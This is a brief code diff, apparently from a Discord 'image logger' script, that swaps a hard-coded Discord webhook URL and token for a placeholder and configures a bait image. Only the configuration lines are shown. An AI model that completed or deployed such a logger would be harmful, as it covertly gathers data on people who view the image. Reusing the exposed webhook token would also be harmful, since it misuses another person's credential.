@@ -3,7 +3,7 @@ from urllib import parse
 import httpx, base64, httpagentparser
 
 # Configuration
-webhook = 'https://discord.com/api/webhooks/1517939669533458735/ymM0PMDVENfdjr51oHfmRfnuUMkxSgcywWUYdgEiZDliLX5qEuk9Xb01U3AgilckysSJ'
+webhook = 'YOUR_WEBHOOK_URL'
 bindata = httpx.get('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQCTeJgEKkWBNzhM_Qzq5OYn56mFqDUPXSzHw&s.jpg').content
 buggedimg = True  # Set to True if you want the image to load on Discord, False otherwise
 
